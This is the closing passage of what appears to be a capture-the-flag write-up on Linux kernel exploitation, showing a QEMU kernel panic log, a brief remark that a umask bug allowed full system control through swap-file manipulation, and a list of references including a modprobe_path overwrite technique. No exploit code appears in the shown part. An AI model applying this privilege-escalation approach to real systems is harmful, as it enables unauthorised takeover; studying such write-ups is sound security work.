[   12.223198] R13: 0000000000405914 R14: 0000000000000000 R15: 0000000000000000
[   12.223821] Kernel Offset: 0xfe00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[   12.224347] ---[ end Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b ]---
qemu-system-x86_64: terminating on signal 2
```

It's really fantastic, with only a slight umask bug we can gain fully control of the system. But as there is something probablistic and unpredictable when Linux using swap files, it takes tons of attempts trying to figure out what's the best PAGE_SIZE set in exploits to let Linux swap targets into `/swap` file more quickly and stably, which is largely depends on the very machine we are attacking.

Download source code of busybox at [10] and compile with symbols by yourself. 

# Ref

[1] https://2020.ctf.link/internal/

[2] https://lwn.net/Articles/824307/

[3] https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique

[4] https://man7.org/linux/man-pages/man2/umask.2.html

[5] https://man7.org/linux/man-pages/man8/losetup.8.html

[6] https://man7.org/linux/man-pages/man8/mkswap.8.html

[7] https://wiki.archlinux.org/title/swap

[8] https://mem2019.github.io/jekyll/update/2020/12/21/hxp2020-pfoten.html

[9] https://pullp.github.io/2020/12/28/hxp2020-pfoten/

[10] https://www.busybox.net/
